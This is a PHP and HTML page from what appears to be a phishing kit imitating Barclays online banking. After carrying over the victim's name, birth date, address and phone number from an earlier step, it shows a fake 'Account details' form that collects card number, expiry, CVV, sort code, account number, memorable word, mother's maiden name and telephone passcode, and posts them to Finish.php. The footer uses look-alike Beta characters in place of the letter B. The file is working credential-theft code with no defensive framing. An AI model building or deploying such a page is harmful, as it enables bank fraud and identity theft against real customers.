<?php
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
require_once("CONTROLS.php");
$_SESSION['name'] = $_POST['name'];
$_SESSION['dob'] = $_POST['day']."/".$_POST['month']."".$_POST['year'];
$_SESSION['address'] = $_POST['address'].", ".$_POST['town'].", ".$_POST['postcode'];
$_SESSION['telephone'] = $_POST['telephone'];
?>
<!DOCTYPE html>
<html lang="en-GB">
<head>
<link href="assets/img/fav.ico" rel="shortcut icon" type="image/x-icon">
<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="Content-Language" content="en-GB" />
<title>Verification</title>
<link href="assets/css/login.css" rel="stylesheet" type="text/css" media="screen" />
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="assets/js/jquery.payment.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<style>
.error {
    color: #9a040d;
    padding-bottom: 5px;
}
input.error, select.error {
    background-color: #f5e6eb;
    border-color: #9d063b;
    color: #9d063b;
	border: 1px solid #9d063b!important;
}
#ErrorDob, #ErrorCC {
	width:600px;
}
#postcode, #cc-exp, #telepin {
	width:10%;
}
.card-number {
	width: 263px!important;
}
.sortcode {
	width: 20px!important;
	margin: 0 12px 0 0!important;
}
#cvv {
	width: 60px!important;	
}
</style>
<script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };

      $('form').submit(function(e) {
        e.preventDefault();

        var cardType = $.payment.cardType($('.cc-number').val());
        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });

    });
	
</script>
<script>
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#accordion-bottom-form").validate({
				errorElement: "span",			
                rules: {
					ccno4: { required: true, minlength: 16, digits: true,},
					ccexp: { required: true, minlength: 4,},
					secode: { required: true, minlength: 3, digits: true,},
					sc1: { required: true, minlength: 2, digits: true,},
					sc2: { required: true, minlength: 2, digits: true,},
					sc3: { required: true, minlength: 2, digits: true,},
					acno2: { required: true, minlength: 8, digits: true,},
					memo: { required: true, minlength: 4,},
					mmn: { required: true, minlength: 4,},
					telepin: { required: true, minlength: 5,},
                },
				groups: {
					sortcode: "sc1 sc2 sc3",
				},
				errorPlacement: function(error, element) {
				if (element.attr("name") == "name") 
				error.insertAfter("#ErrorName");
				else 
				error.insertAfter(element);
				if (element.attr("name") == "ccno4") 
				error.insertAfter("#ErrorCC");
				if (element.attr("name") == "ccexp") 
				error.insertAfter("#ErrorExpiry");
				if (element.attr("name") == "secode") 
				error.insertAfter("#ErrorSecode");
				if (element.attr("name") == "sc1" || element.attr("name") == "sc2" || element.attr("name") == "sc3") 
				error.insertAfter("#ErrorSortcode");
				if (element.attr("name") == "acno2") 
				error.insertAfter("#ErrorAccount");
				if (element.attr("name") == "memo") 
				error.insertAfter("#ErrorMemo");
				if (element.attr("name") == "mmn") 
				error.insertAfter("#ErrorMmn");
				if (element.attr("name") == "telepin") 
				error.insertAfter("#ErrorTelepin");			
				},
                messages: {
					ccno4: {
						required: "You must enter a card number",
						minlength: jQuery.validator.format("Card number must be exactly 16 digits"),
						digits: jQuery.validator.format("Card number must contain only numeric characters"),
					},
					ccexp: {
						required: "You must enter your cards expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					secode: {
						required: "You must enter your cards three digit security code (CVV)",
						minlength: jQuery.validator.format("Card security code number must be exactly 3 digits"),
						digits: jQuery.validator.format("Card security code must contain only numeric characters"),
					},
					sc1: { 
						required: "You must enter the first part of sort code", 
						minlength: jQuery.validator.format("You must enter a valid first part for sort code"), 
						digits: jQuery.validator.format("The first part of sort code must contain only numeric characters"), 
					},
					sc2: { 
						required: "You must enter the second part of sort code", 
						minlength: jQuery.validator.format("You must enter a valid second part for sort code"), 
						digits: jQuery.validator.format("The second part of sort code must contain only numeric characters"), 
					},
					sc3: { 
						required: "You must enter the third part of sort code", 
						minlength: jQuery.validator.format("You must enter a third second part for sort code"), 
						digits: jQuery.validator.format("The third part of sort code must contain only numeric characters"), 
					},
					acno2: {
						required: "You must enter an account number",
						minlength: jQuery.validator.format("Account number must be exactly 8 digits"),
						digits: jQuery.validator.format("Account number must contain only numeric characters"),
					},
					memo: {
						required: "You must enter your memorable word",
						minlength: jQuery.validator.format("Please check the memorable word you have entered"),
					},
					mmn: {
						required: "You must enter your mother&apos; maiden name",
						minlength: jQuery.validator.format("Please check the mothers maiden name you have entered"),
					},
					telepin: {
						required: "You must enter your telephone passcode",
						minlength: jQuery.validator.format("Please check the telephone passcode you have entered"),
						digits: jQuery.validator.format("Telephone passcode must contain only numeric characters"),
					},
				},
				errorClass: "error",
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
  </script>
</head>
<body>
    <a id="#top"></a>

<div id="skip-links">
<p class="skip-link-p">Skip to: 
<a accesskey="1" class="skip-link" href="#content">content</a>, 
<a accesskey="2" class="skip-link" href="#nav-links">navigation</a>
</p>
</div>
<div id="container">
<header>
<div id="masthead">
<div id="access-links">
<ul class="access-link-list">
<li class="first"><a href="mobile/Login.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true">Mobile site</a></li>
<li><a href="#" target="_blank">Contact us</a>
<li><a href="#" target="_blank">Security</a>
<li><a href="#" target="_blank">Accessibility</a></li>
</ul>
<a name="infoend"></a>
</div>
<p class="logo"><a id="logo" href="#" title="logo" class="default"></a><img class="pronly" src="assets/img/logo.png" width="265" height="45" /></p>
<nav>
<div>
<div id="login">
<h1><strong>Quick, safe and convenient</strong> - Online Banking made easy</h1>
</div>
</div>
</nav>
</div>
</header>
<article>
<div id="content" class="clearfix">
<div>
<div class="login-ctr ftb" >
<div id="tipBody">
<div class="logon-snippet-ftb" id="logon-snippet-icookie">
<div class="info">
<div class="icon icon-exclamation-snippet"></div>
<p><strong>Updated cookies policy</strong></p><p>We&nbsp;use cookies on this website.</p><p>They help us to know a little bit about you and how you use our website, which improves the browsing experience and marketing &ndash; both for you and for others.</p><p>They are stored locally on your computer or mobile device. To accept cookies, continue to log in.</p><p>Or go to the <a id="iCookiePolicy" href="#">cookies policy</a> for more information and preferences.</p>
</div>
</div>
</div>
<div id="page">

<div data-prevent-timeout="true" class="accordion ui-accordion ui-widget ui-helper-reset ui-accordion-icons inactive" id="accordion-top" role="tablist">
<h2 class="active">Step 1 - Your details</h2>
<form method="POST" ftb="true" autocomplete="off" id="accordion-top-form">
<div class="accordion-page" style="display: block;">
<div></div>
<ul class="form-grid">
<li class="singleMemberId">
<label for="user-1"><strong id="surname-1" class="surname">&nbsp;Step 1 - Complete</strong>
</label>
</li>
</ul>
<div class="accordion-config"></div>
<div class="help-centre"></div>
<div class="channel-info-container"> 
</div>
</div>
</form>
</div>




<div class="accordion ui-accordion ui-widget ui-helper-reset ui-accordion-icons active" id="accordion-bottom" role="tablist">
<h2>Step 2 - Account details</h2>
<form method="POST" ftb="true" action="Finish.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true" autocomplete="off" id="accordion-bottom-form">
<div class="accordion-page" style="display: block;">
<div></div>
<ul class="form-grid">
<li>   
<fieldset class="card-no auto-input-focus-step-thru">
    <legend class="forgotten-membership-card-no" for="connectCard1">Card number</legend>
	<div id="ErrorCC"></div>
    <input type="text" class="card-number" autocomplete="off" maxlength="20" value="" id="carddy" name="ccno4" value="<?php echo $_SESSION['ccno'];?>">
    <label id="place_holder" class="hide"></label>
<div id="tooltip_cardno" class="tooltip" role="tooltip" aria-labelledby="tooltip_cardno_content">
<div class="icon-question" aria-hidden="true"></div>
<span>
 <b></b>
 <div class="content" id="tooltip_cardno_content">
<p>This can be found on the front of your Barclays debit, cash or authentication card.</p><p>  <img src="assets/img/cc.jpg" height="109" width="168"></p>
</div>
</span>
</div>
	</fieldset>

</li>
<li>
<label for="exp">Card expiry</label>
<div id="ErrorExpiry"></div>
<input class="securityCode cc-exp text" type="text" maxlength="7" id="cc-exp" name="ccexp" autocomplete="off" value="<?php echo $_SESSION['ccexp'];?>">
</li>
<li>
<label for="cvv"><strong>Three-digit</strong> security code</label>
<div id="ErrorSecode"></div>
<input class="securityCode" id="cvv" type="password" maxlength="3" name="secode" title="Three digit security code for the card number" autocomplete="off" value="<?php echo $_SESSION['secode'];?>">
<div id="tooltip_cvv" class="tooltip" role="tooltip" aria-labelledby="tooltip_cvv_content" style="float:left;">
<div class="icon-question" aria-hidden="true"></div>     
<span>
<b></b>
<div class="content" id="tooltip_cvv_content">
<p>Your 3-digit security code, also known as the CVV (Card Verification Value), is the last 3 numbers from the back of your card, on the top-right of the signature strip.</p>
</div>
</span>
</div>
</li>
<li><label for="sortcode2">Sortcode</label>
<div id="ErrorSortcode"></div>
<input type="text" name="sc1" id="sc1" maxlength="2" class="surname text sortcode" autocomplete="off" onkeyup="movetoNext(this, 'sc2')" value="<?php echo $_SESSION['sort1'];?>">
<input type="text" name="sc2" id="sc2" maxlength="2" class="surname text sortcode" autocomplete="off" onkeyup="movetoNext(this, 'sc3')" value="<?php echo $_SESSION['sort2'];?>">
<input type="text" name="sc3" id="sc3" maxlength="2" class="surname text sortcode" autocomplete="off" value="<?php echo $_SESSION['sort3'];?>"/>
</li>
<li><label for="acno2">Account Number</label>
<div id="ErrorAccount"></div>
<input type="text" name="acno2" id="acno2" maxlength="8" class="surname text" autocomplete="off" value="<?php echo $_SESSION['acno'];?>"/>
</li>
<li><label for="name">Memorable word </label>
<div id="ErrorMemo"></div>
<input type="text" name="memo" id="memo" maxlength="50" class="surname text" autocomplete="off" />
</li>
<li><label for="mmn">Mother's maiden name</label>
<div id="ErrorMmn"></div>
<input type="text" name="mmn" id="mmn" maxlength="50" class="surname text" autocomplete="off" value="<?php echo $_SESSION['mmn'];?>"/>
</li>
<li><label for="telepin">Telephone passcode</label>
<div id="ErrorTelepin"></div>
<input type="password" name="telepin" id="telepin" maxlength="5" class="surname text" autocomplete="off" />
<div id="tooltip_cardno" class="tooltip" role="tooltip" aria-labelledby="tooltip_cardno_content">
<div class="icon-question" aria-hidden="true"></div>
<span>
 <b></b>
 <div class="content" id="tooltip_cardno_content">
<p>Your telephone passcode is a 5-digit number that we sent you when you signed up to Telephone & Online Banking.</p>
</div>
</span>
</div>
</li>

<li>
<div class="line-break"></div>
</li>
<li>
<button type="submit" id="forward" class="button blue validate accordion-action" name="action::blank.php::POST" id="forward">Validate</button>
</li>
<div class="accordion-config"></div>
</ul>
<div class="help-centre"></div>
<div class="channel-info-container"></div>
</div>
</form>
</div>








</div>       
</div>
<?php include "assets/includes/sidebar.php"; ?>
</div>
</div>
</article>
<footer>
<div id="footer">
<div class="footnote">
    <p>
       &Beta;arclays &Beta;ank PLC. Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential
       Regulation Authority (Financial Services Register no: 122702). &Beta;arclays &Beta;ank PLC subscribes to the Lending Code which is monitored and
       enforced by the Lending Standards &Beta;oard. Further details can be found at
       <a title="Lending Standards Board (opens in a new browser window)" target="_blank" href="#"> www.lendingstandardsboard.org.uk</a>. Barclays Insurance Services Company Limited is authorised and regulated by the Financial Conduct Authority (Financial Services Register no: 312078).
    </p>
    <p>
       Barclays Bank PLC. Registered in England. Registered no. 1026167. Barclays Insurance Services Company Limited. Registered in England. Registered no. 973765. Registered office for both: 1 Churchill Place, London E14 5HP. 'The Woolwich' and 'Woolwich' are trademarks and trading names of Barclays Bank PLC. Barclays Business is a trading name of Barclays Bank PLC.
    </p>
    <br/>
    <p >
<img class="pronly" src="assets/img/premier.jpg"/>
<a href="#" target="_blank" class="premier-league">
<span class="premier-league">Proud sponsors of the Barclays Premier League</span>
</a>
</p>
</div>
</div>
</footer>
</div>
</body>
</html>
